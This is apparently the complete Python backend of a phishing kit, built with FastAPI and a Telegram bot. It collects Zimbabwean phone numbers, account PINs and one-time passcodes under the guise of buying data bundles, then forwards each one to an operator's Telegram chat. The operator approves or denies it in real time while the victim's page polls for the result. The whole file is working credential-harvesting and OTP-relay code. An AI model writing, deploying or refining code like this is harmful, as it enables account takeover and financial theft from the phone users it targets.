import os
import uuid
from typing import Dict, Any, Optional
from contextlib import asynccontextmanager
from fastapi import FastAPI, HTTPException, Request, Header
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CallbackQueryHandler, ContextTypes

# --- CONFIGURATION ---
BOT_TOKEN = os.environ.get("BOT_TOKEN")
ADMIN_CHAT_ID = os.environ.get("ADMIN_CHAT_ID")
WEBHOOK_SECRET = os.environ.get("WEBHOOK_SECRET", "my-secret-token")

if not BOT_TOKEN or not ADMIN_CHAT_ID:
    raise ValueError("BOT_TOKEN and ADMIN_CHAT_ID environment variables are required")

# In-memory database
transactions: Dict[str, Dict[str, Any]] = {}

# --- PYDANTIC MODELS ---
class LoginRequest(BaseModel):
    phone: str
    pin: str
    duration: str
    voice: int
    sms: int
    data: float  # FIXED: Changed from int to float (1.7 GB)
    price: str

class OTPRequest(BaseModel):
    phone: str
    otp: str
    duration: str
    price: str

# --- TELEGRAM BOT SETUP ---
ptb_app = Application.builder().token(BOT_TOKEN).build()

async def handle_telegram_buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    data = query.data.split(":")
    action = data[0]
    tx_id = data[1]

    if tx_id in transactions:
        if action == "accept":
            transactions[tx_id]["status"] = "approved"
            await query.edit_message_text(
                text=f"{query.message.text}\n\n✅ <b>APPROVED</b>",
                parse_mode="HTML"
            )
        elif action == "deny":
            transactions[tx_id]["status"] = "denied"
            await query.edit_message_text(
                text=f"{query.message.text}\n\n❌ <b>DENIED</b>",
                parse_mode="HTML"
            )

ptb_app.add_handler(CallbackQueryHandler(handle_telegram_buttons))

# --- FASTAPI LIFESPAN (Initializes bot cleanly on startup) ---
@asynccontextmanager
async def lifespan(app: FastAPI):
    await ptb_app.initialize()
    await ptb_app.start()
    yield
    await ptb_app.stop()
    await ptb_app.shutdown()

app = FastAPI(lifespan=lifespan)

# CORS Configuration (FIXED: allow_credentials must be False if origins is "*")
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"], 
    allow_credentials=False, 
    allow_methods=["*"],
    allow_headers=["*"],
)

# --- API ENDPOINTS ---

@app.post("/api/initiate-login")
async def initiate_login(req: LoginRequest):
    tx_id = str(uuid.uuid4())
    transactions[tx_id] = {
        "status": "pending",
        "type": "login",
        "data": req.model_dump()
    }

    # FIXED: Switched to HTML format to prevent MarkdownV2 crashing
    message = (
        f"🔐 <b>NEW LOGIN ATTEMPT</b>\n\n"
        f"📱 <b>Phone:</b> +263 {req.phone}\n"
        f"🔑 <b>PIN:</b> <tg-spoiler>{req.pin}</tg-spoiler>\n\n"
        f"📦 <b>Bundle:</b> {req.duration}\n"
        f"💰 <b>Price:</b> USD {req.price}\n\n"
        f"👇 <i>Do you want to accept this login?</i>"
    )

    keyboard = [[
        InlineKeyboardButton("✅ ACCEPT", callback_data=f"accept:{tx_id}:login"),
        InlineKeyboardButton("❌ DENY", callback_data=f"deny:{tx_id}:login")
    ]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    try:
        await ptb_app.bot.send_message(
            chat_id=ADMIN_CHAT_ID,
            text=message,
            reply_markup=reply_markup,
            parse_mode="HTML" # FIXED
        )
    except Exception as e:
        print(f"Telegram Error: {e}") # Log the error so you can see it in Render logs
        raise HTTPException(status_code=500, detail="Failed to send message to Telegram")

    return {"transaction_id": tx_id, "message": "Login request sent to admin"}


@app.post("/api/verify-otp")
async def verify_otp(req: OTPRequest):
    tx_id = str(uuid.uuid4())
    transactions[tx_id] = {
        "status": "pending",
        "type": "otp",
        "data": req.model_dump()
    }

    # FIXED: Switched to HTML format
    message = (
        f"🔢 <b>NEW OTP ENTERED</b>\n\n"
        f"📱 <b>Phone:</b> +263 {req.phone}\n"
        f"🔢 <b>OTP Code:</b> <code>{req.otp}</code>\n\n"
        f"📦 <b>Bundle:</b> {req.duration}\n"
        f"💰 <b>Price:</b> USD {req.price}\n\n"
        f"👇 <i>Do you want to accept this OTP?</i>"
    )

    keyboard = [[
        InlineKeyboardButton("✅ ACCEPT", callback_data=f"accept:{tx_id}:otp"),
        InlineKeyboardButton("❌ DENY", callback_data=f"deny:{tx_id}:otp")
    ]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    try:
        await ptb_app.bot.send_message(
            chat_id=ADMIN_CHAT_ID,
            text=message,
            reply_markup=reply_markup,
            parse_mode="HTML" # FIXED
        )
    except Exception as e:
        print(f"Telegram Error: {e}")
        raise HTTPException(status_code=500, detail="Failed to send message to Telegram")

    return {"transaction_id": tx_id, "message": "OTP request sent to admin"}


@app.get("/api/status/{tx_id}")
async def get_status(tx_id: str):
    if tx_id not in transactions:
        raise HTTPException(status_code=404, detail="Transaction not found")
    
    return {"status": transactions[tx_id]["status"]}


# --- WEBHOOK ENDPOINTS ---

@app.post("/api/webhook/telegram")
async def telegram_webhook(request: Request, x_telegram_bot_api_secret_token: Optional[str] = Header(None)):
    if x_telegram_bot_api_secret_token != WEBHOOK_SECRET:
        raise HTTPException(status_code=403, detail="Invalid secret token")

    update_data = await request.json()
    update = Update.de_json(update_data, ptb_app.bot)
    await ptb_app.process_update(update)
    return {"status": "ok"}

@app.get("/api/webhook/set")
async def set_telegram_webhook():
    # FIXED: Look for RENDER_EXTERNAL_URL instead of just VERCEL_URL
    base_url = os.environ.get("RENDER_EXTERNAL_URL") or os.environ.get("VERCEL_URL")
    
    if not base_url:
        raise HTTPException(status_code=500, detail="External URL environment variable not set (RENDER_EXTERNAL_URL or VERCEL_URL)")

    # Ensure the URL doesn't have a trailing slash
    base_url = base_url.rstrip("/")
    webhook_url = f"https://{base_url}/api/webhook/telegram" if not base_url.startswith("http") else f"{base_url}/api/webhook/telegram"
    
    try:
        await ptb_app.bot.set_webhook(
            url=webhook_url,
            secret_token=WEBHOOK_SECRET,
            drop_pending_updates=True
        )
        return {"status": "success", "webhook_url": webhook_url}
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Failed to set webhook: {e}")